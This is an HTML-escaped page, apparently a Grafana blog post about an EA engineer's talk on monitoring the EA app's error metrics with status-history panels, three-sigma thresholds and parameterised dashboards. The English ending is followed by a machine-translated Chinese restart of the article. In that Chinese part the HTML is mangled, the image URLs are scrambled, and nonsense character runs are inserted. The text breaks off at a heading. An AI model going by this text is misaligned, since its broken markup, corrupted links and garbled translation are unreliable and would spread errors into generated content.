960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of panels; four with red error boxes are labeled external issue, regression, bug fixed, and external resolved&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multi-panels.png&#34;&#xA;alt=&#34;A screenshot of panels; four with red error boxes are labeled external issue, regression, bug fixed, and external resolved&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;Once the solid thresholds were established, the team set up alerts for every metric, providing them with 24/7 coverage. As a result, they haven’t missed any critical bugs caused by their own code changes since implementing this new system.&lt;/p&gt;&#xA;&lt;h2 id=&#34;moving-beyond-detection&#34;&gt;Moving beyond detection&lt;/h2&gt;&#xA;&lt;p&gt;EA&amp;rsquo;s app doesn&amp;rsquo;t have a traditional backend setup with separate metrics, logs, and traces — &amp;ldquo;You can’t seriously send all the logs from a user’s machine to our server,&amp;rdquo; Chen explained. So when it comes to finding the cause of an error, the team can&amp;rsquo;t simply dive into the logs. Instead, EA only collects a few anonymous JSON events with the type of error and few fields as context.&lt;/p&gt;&#xA;&lt;p&gt;The app&amp;rsquo;s dashboard is set up so if someone sees an error rate spike, for example, they can click on a graph in a panel and find out more about the context of the error. &amp;ldquo;Those contexts help us figure out the root cause,&amp;rdquo; Chen said. The team can also break down the issue by app version or game id. &amp;ldquo;We can test those games locally and try to reproduce the issue, or even reach out to the game team,&amp;rdquo; Chen said. &amp;ldquo;Either way, those are actionable insights.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;Still, breakdowns don&amp;rsquo;t scale, he explained, so if EA had 200 metrics and each metric has 10 fields worth breaking down, the result is another 2,000 panels. &amp;ldquo;That’s just impossible to build or use.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;This is where his idea for functional dashboarding comes in.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;The core idea is that dashboards are not static pages — they’re functions,&amp;rdquo; he said. &amp;ldquo;You can call them by visiting the URL with different parameters and you get the dashboard you need.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;By using the function below, a developer can get the dashboard they need.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-function-call.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-function-call.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A image of the formula for a function call: fn DeepDive(field_breakdown, query_error, query_startup,...) --&amp;gt; Dashboard&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-function-call.png&#34;&#xA;alt=&#34;A image of the formula for a function call: fn DeepDive(field_breakdown, query_error, query_startup,...) --&amp;gt; Dashboard&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;Chen then did a quick demo of a functional dashboard at work, explained what&amp;rsquo;s happening behind the scenes, and shared how to craft links for parameters.&lt;/p&gt;&#xA;&lt;p&gt;He also pointed out how easy it is to maintain this type of dashboard. EA&amp;rsquo;s alert dashboard has more than 200 alerts and is generated from templates. &amp;ldquo;Once you define a query, everything else is automatically generated by scripts,&amp;rdquo; he said. &amp;ldquo;It can be really easy to extend, and we have pipelines that calculate the three sigma thresholds from history and rebuild everything every week so it’s always up to date.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;To learn more, check out Chen&amp;rsquo;s presentation, &amp;ldquo;&#xA;&lt;a href=&#34;/events/grafanacon/2025/electronic-arts-how-to-monitor-error-metrics/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Monitoring EA App&amp;rsquo;s 200+ core error metrics with a scalable, color-coded Grafana dashboard&lt;/a&gt;.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;要成为一个成功的游戏玩家，您必须进行战略和创造性的思考。担任软件工程师&#xA;&lt;a href =“ https://www.ea.com/” target =“ _ blank” rel =“ noopener noreferrer”&gt;电子艺术&lt;/a&gt;（ea），顶级视频游戏公司，需要相同的技能。在监视EA应用程序时尤其如此，EA应用程序是EA游戏的启动器，并由全球数亿人使用。&lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt;监视应用程序的错误，撞车率和其他问题的状态可能与与游戏老板作战一样棘手。一方面，该应用程序由用户自己的机器运行，根据EA软件工程师肯尼·陈（Kenny Chen）的说法，它发出了500个不同的事件。结合事件可能会导致4,000多个可能的指标。即使现实最终是其中的一小部分，开发人员仍然可以一次观察200多个核心指标，从而使Chen称为“巨大而压倒性的”仪表板。&lt;/p&gt;&#xA;&lt;p&gt;在&#xA;&lt;a href =“/events/grafanacon/2025/electronic-arts-how-to-monitor-metrors/？pg = blog＆plcmt = body-txt = body-txt”&gt; grafanacon 2025演示&lt;/a&gt;，陈透露了他如何使用的方式&#xA;&lt;a href =“/oss/grafana？pg = blog＆plcmt = body-txt”&gt; grafana &lt;/a&gt;构建了他所谓的“功能仪表板”系统，该系统允许开发人员有效地监视应用程序的状态。过去，他在几个小时内完成了完整的审查 - “或者也许永远不会，老实说”，他打趣道，现在可以在这段时间内完成这项工作。他说：“经过适当的培训，经过适当的培训，可以在大约10分钟内审查200个指标，这使得始终关注重要的一切。” &lt;/p&gt;&#xA;&lt;p&gt;在演讲中，陈讨论了找到最有效的可视化，有效监测背后的数学和大规模根本原因分析的重要性。&lt;/p&gt;&#xA;&lt;p&gt;“在此之前，我们有时会错过关键问题，仅仅是因为有很多事情要看，而且事情不是很明显。” “由于我们已经设置了此系统，因此我们没有错过任何由我们自己的代码更改造成的关键错误。” &lt;/p&gt;&#xA;&lt;iframe width =“ 560” height =“ 315” src =“ https://www.youtube.com/embed/cqho0oyw6ic?si = bgmcbiuasd4%3frel%3d0”陀螺仪;&#xA;&lt;H2 ID =“大挑战”&gt;大挑战&lt;/h2&gt;&#xA;&lt;p&gt;在EA应用程序上工作带来了一开始的挑战。与微服务不同，Chen解释说：“应用程序是设计的整体。&#xA;&lt;p&gt;在跟踪的指标中包括登录，不同类型的错误和各种崩溃率。 “它们对我们的用户体验同样重要，我们需要密切监视他们全部，”他说。“每当有问题时，我们都想尽快知道。” &lt;/p&gt;&#xA;&lt;p&gt;使用后端服务，工程师将仅监视该应用程序的一个版本，但是EA具有多个版本的同时运行。在他们的旧仪表板中，他们每个版本使用一个量规，以实现指标的全部覆盖范围。&lt;/p&gt;&#xA;&lt;p&gt; ea还每周发布新的版本，因此正在监视的版本列表不断增长。&lt;/p&gt;&#xA;&lt;p&gt;所有这些都翻译成这样的仪表板：&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-gauges-dashboard.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-gauges-dashboard.png” data-srcset =“/媒体/博客/blog/ea-dashboard/image-ea-dashboard-gauges-dashboard.png = w = 320 320w？ /media/blog/ea-dashboard/image-ea-dashboard-gauges-dashboard.png?w=750 750w，/media/Media/ea-dashboard/image-eage-ea-dashboard-dashboard-dashboard-gauges-gauges-dashboard.png？ /media/blog/ea-dashboard/image-ea-dashboard-gauges-dashboard.png?w=1240 1240W，/media/Blog/EA-Dashboard/image-ea-dashboard-dashboard-gaboild-gauges-dashboard.png?w=19201920w“&#xA;data-sizes =“ auto” alt =“带有165量规面板的grafana仪表板“ width =” 960“高度=” 540“/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-gauges-dashboard.png”&#xA;alt =“带有165量格面板的Grafana仪表板” width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;更糟的是，团队意识到所有这些仪表都无法信任。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;“量规可能意味着很多事情：它可以显示最后的读数，它可能显示中位数，可以显示平均水平。如果您有一个装满仪表的仪表板，那真的很容易组成东西。加上仪表符合设计的模糊。完全不同的情况可以在仪表上看起来完全相同。&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-trust-gauges.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-trust-gauges.png” data-srcset =“/媒体/博客/blog/ea-dashboard/image-ea-dashboard-trust-gauges.png？w = 320 320w？ /media/blog/ea-dashboard/image-ea-dashboard-trust-gauges.png?w=750 750w，/media/Blog/ea-dashboard/image-ea-dashboard-trust-gaiges.png?w=900 900we-EA-dashboard-trust-gauges.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=1920 1920w&#34;&#xA;data-sizes =“ auto” alt =“左侧为.23％的量规面板，右侧为两个相关图，一个需要操作，一个不width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-trust-gauges.png”&#xA;alt =“左侧为0.23％的量规面板，右侧为两个相关图，一个需要操作，一个不“宽度=“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;h2 id =“升级 - 上访”&gt;升级可视化&lt;/h2&gt;&#xA;&lt;p&gt;可视化可能会落在一个从简单到复杂的范围内，并且信息的范围从稀疏到密集。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;时间序列包含历史记录中的每个数据点，但是“当您拥有大量时，它们并不容易扫描。”像仪表一样，它们在监视大量指标方面的效果不佳，因此EA的目标是找到简单且信息丰富的东西。&lt;/p&gt;&#xA;&lt;p&gt;解决方案：状态历史记录。&lt;/p&gt;&#xA;&lt;p&gt;“您可以想到一个状态历史小组，就像彩色日历一样，”陈说。 “您可以用不同的含义堆叠行，每个单元格就像一个时间块，例如一个小时。” &lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-status-history.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-status-history.png” data-srcset =“/媒体/blog/ea-dashboard/image-ea-dashboard-status-history.png？w = 320 320w？ /Media/blog/ea-dashboard/image-ea-dashboard-status-history.png?w=750 750W，/media/BLOG/EA-DASHBOOD/IMAGE-EAGE-EAGABOID-EA--AGEABER-IMAGE--DASHBOOD--STATUS-HISTORY.PNG？ /media/blog/ea-dashboard/image-ea-dashboard-status-history.png?w=1240 1240W，/media/Blog/ea-dashboard/image-ea-dashboard-dashboard-status-history.png?w=19201920w“&#xA;data-sizes =“ auto” alt =“一个称为状态历史记录的幻灯片，显示了与速率和音量相关的两行颜色编码框，width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-status-history.png”&#xA;alt =“一个称为状态历史记录的幻灯片，显示了与速率和音量相关的两个颜色编码框” width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;在上面的示例中，使用不同的颜色来显示基于阈值是好还是坏。 “关键是，它具有一个时间轴并且颜色编码。这使其非常有用，＆rdquo;陈说。&lt;/p&gt;&#xA;&lt;p&gt;这种类型的可视化使得很容易快速发现模式，例如哪个指标正在改善或遇到麻烦。它还让EA团队以紧凑的方式观察许多应用程序。&lt;/p&gt;&#xA;&lt;p&gt;“我们只能拥有一个状态历史记录面板，而不是为每个版本的每个版本都有量规，可以在一个面板中自动显示最受欢迎的版本。” &lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-multiple-versions.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-multiple-versions.png” data-srcset =“/媒体/blog/ea-dashboard/image-ea-dashboard-ea-dashboard-multiple-versions.png？w = 320 320w？ /media/blog/ea-dashboard/image-ea-dashboard-multiple-versions.png?w=750 750w，/media/Blog/EA-dashboard/image-eage-ea-dashboard-eaboard-image-ea-dashboard-dashboard-multiple-versions.png?w=900 900w，/media/media/media/blog/ea-dashboard/image-eaboble/image-age-eaboard-eaboarge-multiper-multiple-cers.w= = w = = w = =？ /Media/blog/ea-dashboard/image-ea-dashboard-multiple-versions.png?w=1240 1240W，/media/Blog/EA-Dashboard/image-image-ea-dashboard-multiple-versions.png?w=19201920w“&#xA;data-sizes =“ auto” alt =“一个带有三行绿色框的面板，每个面板在不同的时间间隔“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-multiple-versions.png”&#xA;alt =“一个带有三行绿色框的面板，每个面板在不同的时间间隔“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;这样的面板还可以帮助团队发现不同类型的问题。 Chen将下图引用下图，“如果只有最新版本是红色的，则表示回归。” &lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/ea-dashboard/image-ea-dashboard-regression.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=1040 1040w, /media/blog/ea-dashboard/image-ea-dashboard-regression.png?w=1240 1240W，/media/Blog/ea-dashboard/image-ea-dashboard-regression.png?w=19201920W“&#xA;data-sizes =“ auto” alt =“一个带有三个RO的面板三个应用程序版本的盒子WS，其中一个红行和两个绿色的盒子“ width =“ 960”高度=“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/ea-dashboard/image-ea-dashboard-regression.png”&#xA;alt =“一个针对三个盒子的面板，用于三个应用程序版本，一个红行和两个绿色的盒子“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;另一方面，如果所有版本突然同时变红，则可能表明问题是外部中断。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/ea-dashboard/image-ea-dashboard-external-sistern-sisterue.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-external-issue.png” data-srcset =“/媒体/blog/ea-dashboard/image-ea-dashboard-ea-dashboard-external-isternal-issue.png？ /media/blog/ea-dashboard/image-ea-dashboard-external-issue.png?w=750 750w，/media/Blog/EA-dashboard/image-eaage-age-ea-dashboard-dashboard-dashboard-external-isternal-isternal-isterner-issue.png?w=900 900w，/media/media/media/blog/ea-dashboard/ea-dashboard/image-eage-eeagaboard-eecng-ww = = = 104 /media/blog/ea-dashboard/image-ea-dashboard-external-issue.png?w=1240 1240W，/media/blog/ea-dashboard/image-age-ea-dashboard-exboard-extern-ternal-isternal-isterner-issue.png?w=19201920w&#39;&#xA;data-sizes =“ auto” alt =“一个带有三个行的面板，代表应用程序版本，左半行的绿色框，右半“宽度=” 960“ height =” 540“/&gt;）&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/ea-dashboard/image-ea-dashboard-external-sistery.png”&#xA;alt =“一个代表应用程序版本的三行的面板，左半框在左半，右半“宽度”宽度=“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“ Finder-Good-Thersholds”&gt;查找良好的阈值&#xA;&lt;p&gt;尽管颜色编码是一种有效的可视化工具，但它并不完美。正如Chen指出的那样，“如果您只是随机选择一个阈值，同一指标不会出于真正的理由看起来好或坏。” &lt;/p&gt;&#xA;&lt;p&gt;选择理想的阈值，第一步是检查您的度量标准的直方图。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-timeseries-vs-histargram.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-timeseries-vs-histargram.png” data-srcset =“/媒体/blog/ea-dashboard/image-ea-dashboard-dashboard-dashboard-timeseries-vs-histogram.png？w = 320 320w， /Media/blog/ea-dashboard/image-ea-dashboard-timeseries-vs-histogram.png?w=550 550W，/media/Blog/ea-dashboard/image-ea-dashboard-ea-dashboard-dashboard-timeseries-vs-histogram.png？s-vs-histogram.png？w = 900 900W，/media/blog/ea-dashboard/image-ea-dashboard-timeseries-vs-histogram.png?w=1040 1040w = 1040w，/media/blog/ea-/ea-dashboard/image-eage-ea-dashboard-ea-dashboard-imeseries-imeseries-vs-vs-vs-histagram.png-histagram.png =400000000000000000000000000000000000机/Media/blog/ea-dashboard/image-ea-dashboard-timeseries-vs-histogram.png?w=1920 1920w“&#xA;data-sizes =“ auto” alt =“小时时间序列图的并排图像和小时的错误率直方图” width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/ea-dashboard/image-ea-dashboard-timeseries-vs-histargram.png”&#xA;alt =“每小时时间序列图的并排图像和每小时错误率直方图” width =“ 960”高度=“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;左上方的图是正常的时间序列，而右侧的图像是同一度量的直方图。陈解释说：“直方图显示了每个值的频率。” &lt;/p&gt;&#xA;&lt;p&gt;仔细观察，直方图显示了过去七天中每个可能值的频率。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-histogram.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-histogram.png” data-srcset =“/媒体/博客/blog/ea-dashboard/image-ea-dashboard-histogram.png？w = 320 320w，/media/media/blog/ablog/ea-dashboard/image-image-image-image-image-image-ea-dashboard-aashboard-histoblaboard-histogram.png.png.png.png？png？ /Media/blog/ea-dashboard/image-ea-dashboard-histogram.png?w=750 750w，/media/Blog/EA-DASHBOOD/IMAGE-EA--AGAGE-EA--ASBOOD--ASBOOD-HISTOGRAM /media/blog/ea-dashboard/image-ea-dashboard-histogram.png?w=1240 1240W，/media/blog/ea-dashboard/image-ea-dashboard-histogram.png?w=19201920W“&#xA;data-sizes =“ auto” alt =“图像显示如何读取直方图，突出显示高点和低点”宽度=“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-histogram.png”&#xA;alt =“显示如何读取直方图的图像，突出显示高点和低点” width =“ 960”高=“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;在上面的示例中，度量为1.5％，持续22小时，2.1％为一个小时。陈解释说：“它看起来应该像钟形曲线。”其原因是基于中心限制定理。他说：“如果您的指标来自许多独立的随机事件，则应遵循正常分布。” “这通常适合错误率。” &lt;/p&gt;&#xA;&lt;p&gt;具有正态分布，值不应超过平均值。他说，您可以画一条线以显示可能发生的事情与不太可能发生的事情之间的边界。 “如果您看到一堆不太可能的价值观，那么某些事情就会改变。”例如，这可能是一个新的错误或新事件。和ldquo;边界是一个真正的好地方，可以使您的阈值成为好是坏。” &lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-3sigma.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-3sigma.png” data-srcset =“/媒体/媒体/blog/ea-dashboard/image-ea-dashboard-3sigma.png？ /media/blog/ea-dashboard/image-ea-dashboard-3sigma.png?w=750 750w，/media/Media/ea-ea-dashboard/image-image-ea-dashboard-dashboard-3sigma.png？ /Media/blog/ea-dashboard/image-ea-dashboard-3sigma.png?w=1240 1240W，/media/blog/ea-dashboard/image-ea-dashboard-3sigma.png?w=19201920W&#39;&#xA;data-sizes =“ auto” alt =“一个图表说明3- sigma（标准偏差规则）和类似形状的直方图标记为&#39;good&#39;的图，并且没有值的一部分，标记为&#39;width&#39;width =“ 960”高度=“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-3sigma.png”&#xA;alt =“图表说明了3- sigma（标准偏差规则）和类似的形状直方图标记为&#39;good&#39;，而没有值的一部分，标记为&#39;width&#39;width =“ 960”高度=“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;这是Chen用于计算阈值的公式：&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-in-action.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard.png” data-srcset =“/媒体/blog/blog/ea-dashboard/image-ea-dashboard-in-action.png？ /media/blog/ea-dashboard/image-ea-dashboard-in-actor.png?w=750 750w，/media/Blog/ea-dashboard/image-ea-age-ea-dashboard-ingobaild.png?w=900 900w，/media/media/blog/ablog/ea-dashboard/image-image-image-image-image-image-image-image-image-image-ea-dashboard-inboble-in-actoce.png =104000000000000000000000000000000000000心水棒/Media/blog/ea-dashboard/image-ea-dashboard-in-action.png?w=1240 1240W，/media/blog/ea-dashboard/image-ea-dashboard-image-ea-dashboard-inboard-in-actory.png?w=19201920W“&#xA;data-sizes =“ auto” alt =“带有时间序列图的幻灯片，用于创建其阈值的时间序列图：阈值=均值 + 3 * stddev“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-in-action.png”&#xA;alt =“带有时间序列图的幻灯片，用于创建其阈值的公式：阈值=均值 + 3 * stddev“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“ Big-Payoff”&gt; Big Readoff 